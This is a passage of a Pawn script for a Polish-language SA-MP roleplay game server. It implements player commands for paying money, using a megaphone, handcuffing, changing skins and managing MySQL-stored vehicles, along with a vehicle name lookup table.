return ShowPlayerDialog(playerid, D_COMMANDS, DIALOG_STYLE_LIST,  "Pomoc > Przydatne komendy",""HEX_WHITE"Obiekty\nDrzwi\n"HEX_BLUE"Interakcja z graczem", "Wybierz", "Anuluj");

CMD:pay (playerid, params[])
{
	new targetid, amount;
	if(sscanf(params, "ri", targetid, amount))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /pay [ID/Czêœæ nicku gracza] [iloœæ gotówki]");
	if(!IsPlayerConnected(targetid) || !targetid)
	return SendClientMessage(playerid, COLOR_GRAY,"Ten gracz nie jest, lub nie jest zalogowany do serwera.");
	new Float:X, Float:Y, Float:Z, pvw = GetPlayerVirtualWorld(playerid); GetPlayerPos(playerid, X, Y, Z);
	if(!IsPlayerInRangeOfPoint(targetid, 5.0, X, Y, Z) || GetPlayerVirtualWorld(targetid) != pvw)
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz jest za daleko.");
	if(amount < 1)
	return SendClientMessage(playerid, COLOR_GRAY, "Mo¿esz podaæ minimalnie 1$.");
	if(PlayerCache[playerid][pCash] < amount)
	return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz przy sobie tylu pieniêdzy.");
	PlayerCache[targetid][pCash] += amount;
	PlayerCache[playerid][pCash] -= amount;
	GivePlayerMoney(playerid, -amount); GivePlayerMoney(targetid, amount);
	new msg[128];
	format(msg, sizeof(msg), "> Podajesz %d$ dla gracza %s.", amount, strreplace(ReturnPlayerName(targetid), '_', ' '));
	SendClientMessage(playerid, COLOR_BLUE, msg);
	format(msg, sizeof(msg), "> Otrzymujesz %d$ od gracza %s.", amount, strreplace(ReturnPlayerName(playerid), '_', ' '));
	SendClientMessage(targetid, COLOR_BLUE, msg);
	format(msg, sizeof(msg), "podaje trochê gotówki %s.", strreplace(ReturnPlayerName(targetid), '_', ' '));
	SendPlayerMe(playerid, msg);
	return ApplyAnimation(playerid, "dealer", "dealer_deal", 4.1, 0, 0, 0, 0, 0, 0);
}

stock ShowDialogChangeGroupColor(playerid)
return ShowPlayerDialog(playerid, D_CHANGE_GROUP_COLOR, DIALOG_STYLE_INPUT, "Zmieñ kolor grupy", ""HEX_WHITE"Wpisz poni¿ej kolor HTML: np. {ff0000}FF0000", "ok", "Anuluj");

CMD:m (playerid, params[])
{
	if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
	{

	}
	else
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy by u¿yæ tej komendy.");
	}
	new text[128];
	if(sscanf(params, "s[128]", text))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /m [treœæ] by u¿yæ megafonu");
	new msg[128];
	format(msg, sizeof(msg), "%s (megafon) :o< %s!!!", strreplace(ReturnPlayerName(playerid), '_', ' '), text);
	new pvw = GetPlayerVirtualWorld(playerid),Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == pvw)
			{
				if(IsPlayerInRangeOfPoint(i, 300.0, X, Y, Z))
				{
					SendClientMessage(i, 0xFFF000FF, msg);
				}
			}
		}
	}
	return 1;
}

forward CuffPlayer(playerid, targetid);
public CuffPlayer(playerid, targetid)
{
	new str[64];
	PlayerPlaySoundInRange(playerid, 1190, 5.0);
	if(pCuffed[targetid])
	{
		SetPlayerSpecialAction(targetid, SPECIAL_ACTION_NONE);
		pCuffed[targetid] = false;
		format(str, sizeof(str), "odkuwa %s", RPName(targetid));
		SendPlayerMe(playerid, str);
		KillTimer(pCuffedTimer[targetid]);
		if(IsPlayerInAnyVehicle(targetid))
		TogglePlayerControllable(targetid, 1);
	}
	else
	{	
		if(PumpUpTheJam[targetid]){
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE1);
			return SendClientMessage(playerid, COLOR_RED, "Nie mo¿esz skuæ tego gracza gdy¿ zacz¹³ œpiewaæ on pump up the jam.");
		}
		pCuffed[targetid] = true;
		SetPlayerSpecialAction(targetid, SPECIAL_ACTION_CUFFED);
		format(str, sizeof(str), "skuwa kajdankami %s", RPName(targetid));
		SendPlayerMe(playerid, str);
		pCuffedTimer[targetid] = SetTimerEx("CuffedTimer", 5000, true, "ii", playerid, targetid);
		if(IsPlayerInAnyVehicle(targetid))
		TogglePlayerControllable(targetid, 0);
	}
	return 1;
}

CMD:skin (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new targetid, skinid;
	if(sscanf(params, "ri", targetid, skinid))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie /skin [ID/Czêœæ nazwy gracza] [skin ID]");

	if(!IsPlayerConnected(targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest pod³¹czony do serwera.");

	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest zalogowany.");

	if(skinid < 0 || skinid > 311)
	return SendClientMessage(playerid, COLOR_GRAY, "Skin ID musi mieœciæ siê w przedziale 0-311.");

	SetPlayerSkin(targetid, skinid);

	new msg[128];

	if(targetid != playerid)
	{
		format(msg, sizeof(msg), "%s zmieni³(a) Twój skin na skin ID: %d", ReturnPlayerName(playerid), skinid);
		SendClientMessage(targetid, COLOR_GRAY, msg);

		format(msg, sizeof(msg), "Zmieni³eœ(aœ) skin %s na skin ID: %d", ReturnPlayerName(targetid), skinid);
		SendClientMessage(playerid, COLOR_GRAY, msg);
	}

	format(msg, sizeof(msg), "UPDATE players SET skin = '%d' WHERE uid = '%d'", skinid, PlayerCache[targetid][pUID]);
	cache_delete(mysql_query(DB_HANDLE, msg));
	return 1;
}

CMD:skuj (playerid, params[])
{
	/*if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)*/
	if(PlayerCache[playerid][pLevel] )
	{

	}
	else
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy by u¿yæ tej komendy.");
	}
	new targetid;
	if(sscanf(params, "r", targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /kajdanki [ID/Czêœæ nicku gracza] by skuæ/odkuæ gracza.");
	if(pCuffed[playerid])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz u¿yæ kajdanek bêd¹c skutym.");
	if(playerid == targetid)
	return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz skuæ samego siebie.");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest pod³¹czony do serwera lub nie jest zalogowany.");
	new Float:X, Float:Y, Float:Z, tVW = GetPlayerVirtualWorld(targetid); GetPlayerPos(targetid, X, Y, Z);
	if(GetPlayerVirtualWorld(playerid) != tVW || !IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
	return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz jest zbyt daleko.");
	return CuffPlayer(playerid, targetid);
}

forward CuffedTimer(playerid, targetid);
public CuffedTimer(playerid, targetid)
{
	if(!PlayerCache[playerid][pUID])
	{
		SetPlayerSpecialAction(targetid, SPECIAL_ACTION_NONE);
		pCuffed[targetid] = false;
		SendClientMessage(targetid, COLOR_GRAY, "Gracz który Ciebie sku³ wyszed³ z gry.");
		KillTimer(pCuffedTimer[targetid]);
	}
	else if(!pLogged[targetid])
	{
		pCuffed[targetid] = false;
		KillTimer(pCuffedTimer[targetid]); 
	}
	else if(!IsPlayerInAnyVehicle(targetid) && !PlayerCache[targetid][pJailTime])
	{
		new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
		if(!IsPlayerInRangeOfPoint(targetid, 3.0, X, Y, Z))
		SetPlayerPos(targetid, X+1, Y, Z);
		if(GetPlayerVirtualWorld(targetid) != GetPlayerVirtualWorld(playerid))
		{
			SetPlayerVirtualWorld(targetid, GetPlayerVirtualWorld(playerid));
		}
	}
}

stock CreateSystemVehicle(playerid, model, color, color2, Float:PosX, Float:PosY, Float:PosZ, ownerid, VW, Float:angle, siren, vehicleid)
{
	new query[512];
	format(query, sizeof(query),"INSERT INTO vehicles (model, color, color2, vw, posX, posY, posZ, angle, owner, siren, id) VALUES ('%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f', '%d', '%d', '%d')",
	model, color, color2, VW, PosX, PosY, PosZ, angle, ownerid, siren, vehicleid);
	mysql_query(DB_HANDLE, query);

	if(vehicleid)
	{
		PutPlayerInVehicle(playerid, vehicleid, 0);
	}

	return 1;
}

CMD:ap(playerid, params[])
{
	if(PlayerCache[playerid][pLevel] >= ADMINISTRATION)
	{
		new name[32], color, color2, siren;
		if(sscanf(params, "s[32]iii", name, color, color2, siren))
			return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /ap [Czêœæ/nazwa pojazdu] [ID koloru] [ID koloru 2] [wartoœæ syreny]");

		new model;
		for(new i=400; i<=611; i++)
		{
			if(strfind(GetVehicleName(i), name, true) != -1)
			model = i;
		}
		if(!model)
		return SendClientMessage(playerid, COLOR_GRAY, "Nie znaleziono takiego pojazdu.");

		new Float:x, Float:y, Float:z, Float:ang; 
		GetPlayerPos(playerid, x,y,z);
		GetPlayerFacingAngle(playerid, ang);

		new vid = CreateVehicle(model, x,y,z, ang, color, color2, -1, siren);

		new query[256];
		format(query, sizeof(query), "INSERT INTO vehicles (playerUID, model, color, color2, posX, posY, posZ, gameId, siren, virtualWorld, register) VALUES ('%d', '%d', '%d', '%d', '%f', '%f', '%f', '%d', '%d', '%d', 1)",
		PlayerCache[playerid][pUID], model, color, color2, x,y,z, vid, siren, GetPlayerVirtualWorld(playerid));
		mysql_query(DB_HANDLE, query, false);

		new uid;
		format(query, sizeof(query), "SELECT uid FROM vehicles WHERE gameId = '%d'", vid);
		new Cache:cache = mysql_query(DB_HANDLE, query);
		cache_get_value_name_int(0, "uid", uid);
		cache_delete(cache);

		format(query, sizeof(query), "> Utworzono pojazd "HEX_WHITE"%s (UID: %d, ID: %d)", GetVehicleName(model), uid, vid);
		SendClientMessage(playerid, COLOR_GREEN, query);
		PutPlayerInVehicle(playerid, vid, 0);
	}


	return 1;
}

stock ShowDialogVehicleOptions(playerid)
return ShowPlayerDialog(playerid, D_V_OPTIONS, DIALOG_STYLE_LIST, "Zarz¹dzaj pojazdem", ""HEX_WHITE"1\tOtwórz/zamknij maskê\n2\tOtwórz/zamknij baga¿nik\n3\tZasuñ/wysuñ szyby\n-\n4\tPodpisz pojazd pod grupê\n5\tSprzedaj pojazd graczowi", "Wybierz", "Anuluj");

CMD:v (playerid, params[])
{

	new sub[32], uid;
	sscanf(params, "s[32]i", sub, uid);

	if(!Isnull(sub))
	{
		if(!strcmp(sub, "namierz", true))
		{
			// return SendClientMessage(playerid, COLOR_GRAY, "Aby namierzaæ pojazdy grupowe musisz mieæ odpowiednie uprawnienia nadane przez lidera.");
			/*if( PlayerCache[playerid][pCurrentVehicle][vState] == 0 &&  PlayerCache[playerid][pCurrentVehicle][vOwner] != PlayerCache[playerid][pUID])
			{
				SendClientMessage(playerid, COLOR_GRAY, "Mo¿esz namierzaæ tylko pojazdy nale¿¹ce do Ciebie.");
				return ClearAnimations(playerid);
			}
			if( PlayerCache[playerid][pCurrentVehicle][vID] == 0)
			return SendClientMessage(playerid, COLOR_GRAY, "Ten pojazd nie jest zespawnowany.");
			DestroyDynamicMapIcon(MapIcon[playerid]);
			KillTimer(MapIconTimer[playerid]);
			MapIcon[playerid] = CreateDynamicMapIcon( PlayerCache[playerid][pCurrentVehicle][vPosX],  PlayerCache[playerid][pCurrentVehicle][vPosY],  PlayerCache[playerid][pCurrentVehicle][vPosZ], 55,-1,  0, 0, playerid,-1, 3);
			MapIconTimer[playerid] = SetTimerEx("DestroyIcon", 5000*60, false, "i", playerid);
			return TextDrawForPlayerEx(playerid, 1, "~g~~h~Ikona pojazdu pojawila sie na radarze.", 5000);*/
		}
		else if(!strcmp(sub, "z", true))
		{
			new Float:vX, Float:vY, Float:vZ, veVW, pVW=GetPlayerVirtualWorld(playerid);
			for(new i; i<=GetVehiclePoolSize(); i++)
			{
				GetVehiclePos(i, vX, vY, vZ);
				veVW = GetVehicleVirtualWorld(i);
				if(pVW == veVW)
				{
					if(IsPlayerInRangeOfPoint(playerid, 5.0, vX, vY, vZ))
					{
						if(!HasPlayerAccessToVehicle(playerid, i)){
							return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz kluczy do tego pojazdu.", 1500);
						}
						ApplyAnimation(playerid, "BD_FIRE", "wash_up", 4.1, 0, 0, 0, 0, 0, 0);
						PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
						new engine,lights,alarm,doors,bonnet,boot,objective;
						GetVehicleParamsEx(i, engine, lights, alarm, doors, bonnet, boot, objective);
						if(doors)
						{
							SendPlayerMe(playerid, "zamyka pojazd.");
							SetVehicleParamsEx(i, engine, lights, alarm, 0, bonnet, boot, objective);
							return GameTextForPlayer(playerid, "~w~Pojazd ~r~~h~zamkniety", 3000, 4);
						}
						else
						{
							SendPlayerMe(playerid, "otwiera pojazd.");
							SetVehicleParamsEx(i, engine, lights, alarm, 1, bonnet, boot, objective);
							return GameTextForPlayer(playerid, "~w~Pojazd ~g~~h~otwarty", 3000, 4);
						}
					}
				}
			}
		}
	}
	if(!Isnull(params))
	{
		if(!strcmp(params, "info", true))
		{
			new Float:X, Float:Y, Float:Z;
			for(new i; i<=GetVehiclePoolSize(); i++)
			{
				GetVehiclePos(i, X, Y, Z);
				if(IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
				{
					return ShowDialogVInfo(playerid, i);
				}
			}
		}
		else if(!strcmp(params, "parkuj", true))
		{
			if(IsPlayerInAnyVehicle(playerid))
			{
				if(GetPlayerVehicleSeat(playerid) == 0)
				{
					
					if( !HasPlayerAccessToVehicle(playerid, PlayerCache[playerid][pCurrentVehicle][vID]))
					{
						TextDrawForPlayerEx(playerid, 1, "~r~~h~Nie posiadasz kluczy do tego pojazdu", 3000);
						return ClearAnimations(playerid);
					}
					GetVehiclePos(PlayerCache[playerid][pCurrentVehicle][vID],  PlayerCache[playerid][pCurrentVehicle][vPosX],  PlayerCache[playerid][pCurrentVehicle][vPosY],  PlayerCache[playerid][pCurrentVehicle][vPosZ]);
					PlayerCache[playerid][pCurrentVehicle][vVW] = GetPlayerVirtualWorld(playerid);
					GetVehicleZAngle(PlayerCache[playerid][pCurrentVehicle][vID],  PlayerCache[playerid][pCurrentVehicle][vAngle]);

					new query[256];
					format(query, sizeof(query), "UPDATE vehicles SET posX=%f, posY=%f, posZ=%f, angle=%f WHERE gameId=%d", PlayerCache[playerid][pCurrentVehicle][vPosX],  PlayerCache[playerid][pCurrentVehicle][vPosY],  PlayerCache[playerid][pCurrentVehicle][vPosZ],
					PlayerCache[playerid][pCurrentVehicle][vAngle], PlayerCache[playerid][pCurrentVehicle][vID]);
					mysql_query(DB_HANDLE, query, false);

					return TextDrawForPlayerEx(playerid, 1, "Przeparkowano pojazd.", 3000);
				}
			}
		}
		else
		return SendClientMessage(playerid, COLOR_GRAY, "Tip: /v [parkuj] [z] [info]");
	}
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(GetPlayerVehicleSeat(playerid) == 0){
			if(HasPlayerAccessToVehicle(playerid, GetPlayerVehicleID(playerid) ) ){
				return ShowDialogVehicleOptions(playerid);
			}
		}
	}

	new query[128];
	format(query, sizeof(query), "SELECT uid, HP, model, gameId FROM vehicles WHERE playerUID=%d", PlayerCache[playerid][pUID]);
	new Cache:cache = mysql_query(DB_HANDLE, query);

	new rows = cache_num_rows();

	new list[1024], info[128];

	new Float:HP, model, gameId;

	for(new i=0; i<rows; i++){
		cache_get_value_name_int(i, "uid", uid);
		cache_get_value_name_int(i, "model", model);
		cache_get_value_name_float(i, "HP", HP);
		cache_get_value_name_int(i, "gameId", gameId);

		format(info, sizeof(info), ""HEX_WHITE"%d\t%s\n", uid, GetVehicleName(model));
		if(gameId)
			format(info, sizeof(info), ""HEX_WHITE"%d\t%s*\n", uid, GetVehicleName(model));
		strins(list, info, strlen(list));
	}
		
	ShowPlayerDialog(playerid, D_VEHICLES, DIALOG_STYLE_LIST, "Pojazdy (* - zespawnowany)", list, "(Un)Spawn", "Anuluj");
	cache_delete(cache);
	if(!rows){
		cache_delete(cache);
		ShowDialogInfo(playerid, "Nie posiadasz ¿adnych pojazdów.\n\nPojazd mo¿esz nabyæ od innego gracza lub kupiæ jakiœ w salonie samochodowym.");
		return 1;
	}
		
	return 1;
}

stock ShowDialogVInfo(playerid, vuid)
{

	new info[525];
	format(info, sizeof(info), "Marka: ~y~%s~w~ Paliwo: ~y~%d/100~w~ Kolor: ~y~%d %d ~w~Przebieg: ~y~%dkm",
	GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]),  PlayerCache[playerid][pCurrentVehicle][vFuel],  PlayerCache[playerid][pCurrentVehicle][vColor],  PlayerCache[playerid][pCurrentVehicle][vColor2], floatround( PlayerCache[playerid][pCurrentVehicle][vMileAge])/1000);
	return TextDrawForPlayerEx(playerid, 0, info, 10000);
}


stock GetVehicleName(vehicleid)
{
	new name[64];
	switch(vehicleid)
	{
		case 400: name =  "Landstalker";
		case 401: name =  "Bravura";
		case 402: name =  "Buffalo";
		case 403: name =  "Linerunner";
		case 404: name =  "Perennial";
		case 405: name =  "Sentinel";
		case 406: name =  "Dumper";
		case 407: name =  "Firetruck";
		case 408: name =  "Trashmaster";
		case 409: name =  "Stretch";
		case 410: name =  "Manana";
		case 411: name =  "Infernus";
		case 412: name =  "Voodoo";
		case 413: name =  "Pony";
		case 414: name =  "Mule";
		case 415: name =  "Cheetah";
		case 416: name =  "Ambulance";
		case 417: name =  "Leviathan";
		case 418: name =  "Moonbeam";
		case 419: name =  "Esperanto";
		case 420: name =  "Taxi";
		case 421: name =  "Washington";
		case 422: name =  "Bobcat";
		case 423: name =  "Mr. Whoopee";
		case 424: name =  "BF Injection";
		case 425: name =  "Hunter";
		case 426: name =  "Premier";
		case 427: name =  "Enforcer";
		case 428: name =  "Securicar";
		case 429: name =  "Banshee";
		case 430: name =  "Predator";
		case 431: name =  "Bus";
		case 432: name =  "Rhino";
		case 433: name =  "Barracks";
		case 434: name =  "Hotknife";
		case 435: name =  "Article Trailer";
		case 436: name =  "Previon";
		case 437: name =  "Coach";
		case 438: name =  "Cabbie";
		case 439: name =  "Stallion";
		case 440: name =  "Rumpo";
		case 441: name =  "RC Bandit";
		case 442: name =  "Romero";
		case 443: name =  "Packer";
		case 444: name =  "Monster";
		case 445: name =  "Admiral";
		case 446: name =  "Squallo";
		case 447: name =  "Seasparrow";
		case 448: name =  "Pizzaboy";
		case 449: name =  "Tram";
		case 450: name =  "Article Trailer 2";
		case 451: name =  "Turismo";
		case 452: name =  "Speeder";
		case 453: name =  "Reefer";
		case 454: name =  "Tropic";
		case 455: name =  "Flatbed";
		case 456: name =  "Yankee";
		case 457: name =  "Caddy";
		case 458: name =  "Solair";
		case 459: name =  "Topfun Van (Berkley's RC)";
		case 460: name =  "Skimmer";
		case 461: name =  "PCJ-600";
		case 462: name =  "Faggio";
		case 463: name =  "Freeway";
		case 464: name =  "RC Baron";
		case 465: name =  "RC Raider";
		case 466: name =  "Glendale";
		case 467: name =  "Oceanic";
		case 468: name =  "Sanchez";
		case 469: name =  "Sparrow";
		case 470: name =  "Patriot";
		case 471: name =  "Quad";
		case 472: name =  "Coastguard";
		case 473: name =  "Dinghy";
		case 474: name =  "Hermes";
		case 475: name =  "Sabre";
		case 476: name =  "Rustler";
		case 477: name =  "ZR-350";
		case 478: name =  "Walton";
		case 479: name =  "Regina";
		case 480: name =  "Comet";
		case 481: name =  "BMX";
		case 482: name =  "Burrito";
		case 483: name =  "Camper";
		case 484: name =  "Marquis";
		case 485: name =  "Baggage";
		case 486: name =  "Dozer";
		case 487: name =  "Maverick";
		case 488: name =  "SAN News Maverick";
		case 489: name =  "Rancher";
		case 490: name =  "FBI Rancher";
		case 491: name =  "Virgo";
		case 492: name =  "Greenwood";
		case 493: name =  "Jetmax";
		case 494: name =  "Hotring Racer";
		case 495: name =  "Sandking";
		case 496: name =  "Blista Compact";
		case 497: name =  "Police Maverick";
		case 498: name =  "Boxville";
		case 499: name =  "Benson";
		case 500: name =  "Mesa";
		case 501: name =  "RC Goblin";
		case 502: name =  "Hotring Racer A";
		case 503: name =  "Hotring Racer B";
		case 504: name =  "Bloodring Banger";
		case 505: name =  "Rancher Lure";
		case 506: name =  "Super GT";
		case 507: name =  "Elegant";
		case 508: name =  "Journey";
		case 509: name =  "Bike";
		case 510: name =  "Mountain Bike";
		case 511: name =  "Beagle";
		case 512: name =  "Cropduster";
		case 513: name =  "Stuntplane";
		case 514: name =  "Tanker";
		case 515: name =  "Roadtrain";
		case 516: name =  "Nebula";
		case 517: name =  "Majestic";
		case 518: name =  "Buccaneer";
		case 519: name =  "Shamal";
		case 520: name =  "Hydra";
		case 521: name =  "FCR-900";
		case 522: name =  "NRG-500";
		case 523: name =  "HPV1000";
		case 524: name =  "Cement Truck";
		case 525: name =  "Towtruck";
		case 526: name =  "Fortune";
		case 527: name =  "Cadrona";
		case 528: name =  "FBI Truck";
		case 529: name =  "Willard";
		case 530: name =  "Forklift";
		case 531: name =  "Tractor";
		case 532: name =  "Combine Harvester";
		case 533: name =  "Feltzer";
		case 534: name =  "Remington";
		case 535: name =  "Slamvan";
		case 536: name =  "Blade";
		case 537: name =  "Freight (Train)";
		case 538: name =  "Brownstreak (Train)";
		case 539: name =  "Vortex";
		case 540: name =  "Vincent";
		case 541: name =  "Bullet";
		case 542: name =  "Clover";
		case 543: name =  "Sadler";
		case 544: name =  "Firetruck LA";
		case 545: name =  "Hustler";
		case 546: name =  "Intruder";
		case 547: name =  "Primo";
		case 548: name =  "Cargobob";
		case 549: name =  "Tampa";
		case 550: name =  "Sunrise";
		case 551: name =  "Merit";
		case 552: name =  "Utility Van";
		case 553: name =  "Nevada";
		case 554: name =  "Yosemite";
		case 555: name =  "Windsor";
		case 556: name =  "Monster A";
		case 557: name =  "Monster B";
		case 558: name =  "Uranus";
		case 559: name =  "Jester";
		case 560: name =  "Sultan";
		case 561: name =  "Station Wagons";
		case 562: name =  "Elegy";
		case 563: name =  "Raindance";
		case 564: name =  "RC Tiger";
		case 565: name =  "Flash";
		case 566: name =  "Tahoma";
		case 567: name =  "Savanna";
		case 568: name =  "Bandito";
		case 569: name =  "Freight Flat Trailer (Train)";
		case 570: name =  "Streak Trailer (Train)";
		case 571: name =  "Kart";
		case 572: name =  "Mower";
		case 573: name =  "Dune";
		case 574: name =  "Sweeper";
		case 575: name =  "Broadway";
		case 576: name =  "Tornado";
		case 577: name =  "AT400";
		case 578: name =  "DFT-30";
		case 579: name =  "Huntley";
		case 580: name =  "Stafford";
		case 581: name =  "BF-400";
		case 582: name =  "Newsvan";
		case 583: name =  "Tug";
		case 584: name =  "Petrol Trailer";
		case 585: name =  "Emperor";
		case 586: name =  "Wayfarer";
		case 587: name =  "Euros";
		case 588: name =  "Hotdog";
		case 589: name =  "Club";
		case 590: name =  "Freight Box Trailer (Train)";
		case 591: name =  "Article Trailer 3";
		case 592: name =  "Andromada";
		case 593: name =  "Dodo";
		case 594: name =  "RC Cam";
		case 595: name =  "Launch";
		case 596: name =  "Police Car (LSPD)";
		case 597: name =  "Police Car (SFPD)";
		case 598: name =  "Police Car (LVPD)";
		case 599: name =  "Police Ranger";
		case 600: name =  "Picador";
		case 601: name =  "S.W.A.T.";
		case 602: name =  "Alpha";
		case 603: name =  "Phoenix";
		case 604: name =  "Glendale Shit";
		case 605: name =  "Sadler Shit";
		case 606: name =  "Baggage Trailer A";
		case 607: name =  "Baggage Trailer B";
		case 608: name =  "Tug Stairs Trailer";
		case 609: name =  "Boxville";
		case 610: name =  "Farm Trailer";
		case 611: name =  "Utility Trailer";
	}
	return name;
}

public OnVehicleDeath(vehicleid, killerid)
{

/* 876.5847;
		 PlayerCache[playerid][pCurrentVehicle][vPosY] = -1259.2781;
		 PlayerCache[playerid][pCurrentVehicle][vPosZ] = 14.6456;*/
	new Float:X, Float:Y, Float:Z;
	GetVehiclePos(vehicleid,X, Y, Z);
		
	new Float:ang;
	new VW=GetVehicleVirtualWorld(vehicleid);
	GetVehicleZAngle(vehicleid, ang);

	new query[256];
	format(query, sizeof(query), "UPDATE vehicles SET virtualWorld=%d, posX=%f, posY=%f, posZ=%f, HP=300.0, angle=%f WHERE gameId=%d;", VW, X,Y,Z,ang,vehicleid);
	mysql_query(DB_HANDLE, query, false);

	UnSpawnVehicle(vehicleid);


	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID] ==  PlayerCache[i][pCurrentVehicle][vPlayerUID])
			{
				DestroyDynamicMapIcon(MapIcon[i]);
				KillTimer(MapIconTimer[i]);
				MapIcon[i] = CreateDynamicMapIcon(X,Y,Z, 55,-1,   VW, 0, i,-1, 3);
				MapIconTimer[i] = SetTimerEx("DestroyIcon", 5000*60, false, "i", i);
				TextDrawForPlayerEx(i, 1, "Twoj pojazd zostal odspawnowany po zniszczeniu.~n~Miejsce spawnu pojazdu zostalo oznaczone na mapie.", 10000);
				return 1;
			}
		}
	}
	return 1;
}

CMD:adrzwi (playerid, params[])
{
	/*if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new pvw = GetPlayerVirtualWorld(playerid);
	for(new i; i<LastdUID; i++)
	{
		if(!DoorCache[i][dDestroyed])
		{
			if(pvw == DoorCache[i][dInsVW])
			{
				if(IsPlayerInRangeOfPoint(playerid, 1.5, DoorCache[i][dInsX], DoorCache[i][dInsY], DoorCache[i][dInsZ]))
				{
					pVal[playerid] = i;
					return ShowPlayerDialog(playerid, D_ADMIN_DOOR, DIALOG_STYLE_LIST, "Zarz¹dzaj drzwiami", "1\tUsuñ drzwi\n2\tZmieñ wyjœciowy VW\n3\tZmieñ nazwê drzwi", "Wybierz", "Anuluj");
				}
			}
			else if(pvw == DoorCache[i][dOutVW])
			{
				if(IsPlayerInRangeOfPoint(playerid, 1.5, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]))
				{
					pVal[playerid] = i;
					return ShowPlayerDialog(playerid, D_ADMIN_DOOR, DIALOG_STYLE_LIST, "Zarz¹dzaj drzwiami", "1\tUsuñ drzwi\n2\tZmieñ wyjœciowy VW\n3\tZmieñ nazwê drzwi", "Wybierz", "Anuluj");
				}
			}
		}
	}*/
	return ShowDialogInfo(playerid, "Nie znajdujesz siê przy ¿adnych drzwiach.");
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{	
	if(!pEnteringCar[playerid])
	{
		pEnteringCar[playerid] = true;
		SetTimerEx("DisableEnteringCar", 100, false, "i", playerid);
	}
	/*
	new vuid = GetVehicleUID(vehicleid);
	if(! PlayerCache[playerid][pCurrentVehicle][vOpen])
	{
		TextDrawForPlayerEx(playerid, 1, "~r~Ten pojazd jest zamkniety!", 1500);
		return ClearAnimations(playerid);
	}
	if(!ispassenger)
	{
		if( PlayerCache[playerid][pCurrentVehicle][vState] == 2)
		{
			new guid =  PlayerCache[playerid][pCurrentVehicle][vOwner];
			new puid = PlayerCache[playerid][pUID];
			if(PlayerCache[puid][pGroup] == guid)
			{
				if(PlayerCache[puid][pGroupVehicle])
				return 1;
			}
			if(PlayerCache[puid][pGroup2] == guid)
			{
				if(PlayerCache[puid][pGroupVehicle2])
				return 1;
			}
			if(PlayerCache[puid][pGroup3] == guid)
			{
				if(PlayerCache[puid][pGroupVehicle3])
				return 1;
			}
			TextDrawForPlayerEx(playerid, 1, "~r~~h~Nie posiadasz kluczy do tego pojazdu", 3000);
			return ClearAnimations(playerid);
		}
		if( PlayerCache[playerid][pCurrentVehicle][vOwner] != PlayerCache[playerid][pUID])
		{
			TextDrawForPlayerEx(playerid, 1, "~r~~h~Ten pojazd nie nalezy do Ciebie!", 3000);
			return ClearAnimations(playerid);
		}
	}*/
	return 1;
}

forward DisableEnteringCar(playerid);
public DisableEnteringCar(playerid)
pEnteringCar[playerid] = false;

stock SpawnVehicle(vuid)
{
	new query[64];
	format(query, sizeof(query), "SELECT * FROM vehicles WHERE uid=%d LIMIT 1;", vuid);
	new Cache:cache = mysql_query(DB_HANDLE, query);

	new Float:posX, Float:posY, Float:posZ, Float:angle,
	color, color2, model,siren, virtualWorld, 
	register, Float:HP;

	cache_get_value_name_float(0, "posX", posX);
	cache_get_value_name_float(0, "posY", posY);
	cache_get_value_name_float(0, "posZ", posZ);
	cache_get_value_name_float(0, "angle", angle);
	cache_get_value_name_float(0, "HP", HP);
	cache_get_value_name_int(0, "color", color);
	cache_get_value_name_int(0, "color2", color2);
	cache_get_value_name_int(0, "model", model);
	cache_get_value_name_int(0, "siren", siren);
	cache_get_value_name_int(0, "virtualWorld", virtualWorld);
	cache_get_value_name_int(0, "register", register);


	new vehicleId=CreateVehicle( 
	model,  posX,  posY, posZ, angle,  color,
	color2, -1, siren);

	new str[32];
	if( register)
	format(str, sizeof(str), ""HEX_BLACK"LS-%000d", vuid);
	else
	format(str, sizeof(str), " ");
	SetVehicleNumberPlate( vehicleId, str);

	SetVehicleHealth( vehicleId,  HP);
	SetVehicleZAngle( vehicleId,  angle);
	SetVehicleVirtualWorld( vehicleId,  virtualWorld);
	SetVehicleParamsEx( vehicleId,  0,  0,  0,  0,  0, 0,  0);

	cache_delete(cache);
